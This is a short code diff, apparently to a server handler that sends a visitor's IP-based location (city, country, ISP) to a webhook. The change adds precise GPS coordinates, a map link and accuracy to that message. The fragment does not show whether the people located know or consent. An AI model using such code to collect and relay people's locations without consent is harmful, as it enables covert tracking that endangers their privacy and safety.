@@ -17,14 +17,19 @@ Location: ${geo.city || "?"}, ${geo.country || "?"}
 ISP: ${geo.isp || "unknown"}
 `;
 
+if (data.lat && data.lon) {
+      msg += `
+GPS: https://maps.google.com/?q=${data.lat},${data.lon}
+Accuracy: ${data.accuracy}m
+`;
+    }
+
     await fetch(WEBHOOK_URL, {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
       },
-      body: JSON.stringify({
-        content: msg
-      })
+      body: JSON.stringify({ content: msg })
     });
 
     res.status(200).json({ ok: true });
